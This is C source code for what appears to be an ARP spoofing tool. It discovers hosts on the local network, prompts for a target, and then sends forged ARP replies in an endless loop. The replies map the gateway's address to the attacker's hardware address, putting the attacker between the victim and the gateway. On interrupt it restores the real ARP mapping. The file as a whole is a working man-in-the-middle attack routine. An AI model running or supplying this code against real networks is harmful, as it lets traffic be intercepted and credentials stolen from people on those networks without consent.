#include "arpspoof.h"

short __arpspoof_setup__( char *iface, struct net *_net )
{   
    struct libnet_ether_addr *hw;
    if ( !(lt = libnet_init( LIBNET_LINK, iface, arpspoof_errbuf )) ) {
        return -1;
    }

    // hardware address of device
    if ( !(hw = libnet_get_hwaddr( lt )) ) {
        sprintf( arpspoof_errbuf, "%s", libnet_geterror( lt ) );
        return -1;
    }

    tty = isatty( 1 );
    sprintf( 
        _net->hw, "%02x:%02x:%02x:%02x:%02x:%02x",
            hw->ether_addr_octet[0],
            hw->ether_addr_octet[1],
            hw->ether_addr_octet[2],
            hw->ether_addr_octet[3],
            hw->ether_addr_octet[4],
            hw->ether_addr_octet[5]
    );

    if ( dev_addr( iface, _net->ip, IPV4, arpspoof_errbuf ) < 0 ) {
        return -1;
    }
    if ( dev_addr( iface, _net->nmask, MASK, arpspoof_errbuf ) < 0 ) {
        return -1;
    }
    
    _net->iface       = iface;
    _net->hosts_range = calc_hosts( _net->ip, _net->nmask );
    _net->start_ip    = net_off(    _net->ip, _net->nmask );
    _net->subnet      = calc_subnet( _net->nmask );
    return 0;
}

short arp_receiver_start( struct net *_net )
{
    int err;
    pthread_t thread;
    
    err = pthread_create(
        &thread,
        NULL,
        arp_receiver,
        (void *) _net
    );

    if ( err ) {
        sprintf( 
            arpspoof_errbuf, 
            "Error spawning arp_receiver() thread!\n" 
        );
        return -1;
    }
    v_out( VINF, "%s", "Arp receiver spawned successfully!\n" );
    mssleep( 0.5 );
    return 0;
}

void arp_clear_arp( int signal )
{
    struct arpspf_eth_hdr *eth;
    struct arpspf_arp_hdr *arp;

    arp = build_arp_hdr(
        ARPOP_REPLY,
        endpoints.target_hw,
        endpoints.target,
        endpoints.gateway_hw,
        endpoints.gateway
    );

    eth = build_eth_hdr(
        endpoints.target_hw, _net.hw
    );

    v_out( VINF, "%s", "\nRestoring arp table...\n" );
    for ( int8_t i = 0 ; i < 10 ; i++ ) {
        arp_inject(
            lt, eth, arp
        );
        sleep( 1 );
    }
    printf( "\n" );
    exit( 0 );
}

void __spoof( void )
{
    struct arpspf_eth_hdr *eth;
    struct arpspf_arp_hdr *arp;

    arp = build_arp_hdr(
        ARPOP_REPLY,
        endpoints.target_hw,
        endpoints.target,
        _net.hw,
        endpoints.gateway
    );

    eth = build_eth_hdr(
        endpoints.target_hw, _net.hw
    );

    for ( ;; ) {
        arp_inject( lt, eth, arp );
        sleep( 2 );
    }
}

void list_endpoints( char *iface )
{
    struct endpoint *endps = _endps;
    if ( lookup_arp( iface, NULL, NULL ) < 0 ){
        __die( arpspoof_errbuf );
    }
    
    v_out( VINF, "%s", "Listing endpoints...\n" );
    for ( uint16_t i = 0 ; i < live_hosts ; i++ ){
        if ( strcmp( endps->host_ip, endpoints.gateway ) != 0 && strcmp( endps->host_ip, _net.ip ) != 0 ) {
            v_out( VINF, "%s\n", endps->host_ip );
        }
        endps++;
    }
}

void arpspoof( struct net *_net, struct spf_endpoints *_spf )
{
    short t;
    t = strcmp( _spf->target, "0" );
    switch ( t ) {
        case 0:
            v_out( VWARN, "%s", "Target not specified!\n" );
            v_out( VINF, "%s", "Refreshing arp table...\n" );
            arp_refresh( _net );

            list_endpoints( _net->iface );
            v_out( VINF, "%s", "Choose target to spoof... " );
            scanf( "%s", _spf->target );
            break;
        
        default:
            if ( arp_receiver_start( _net ) < 0 )
                __die( arpspoof_errbuf );
            
            v_out( VINF, "%s", "Probing target...\n" );
            probe_endpoint( _spf->target, _net );

            v_out( VINF, "%s", "Probing gateway...\n" );
            probe_endpoint( _spf->gateway, _net );
            v_ch( '\n' );
            break;
    }
    
    if ( lookup_arp( _net->iface, _spf->target, _spf->target_hw ) < 0 ) 
            __die( arpspoof_errbuf );

    if ( lookup_arp( _net->iface, _spf->gateway, _spf->gateway_hw ) < 0 )
            __die( arpspoof_errbuf );
        
    if ( strlen( _spf->target_hw ) <= 0 )
        __die( "Target not found!\n" );
    

    signal( SIGINT,  arp_clear_arp );
    signal( SIGTERM, arp_clear_arp );
    __spoof();
}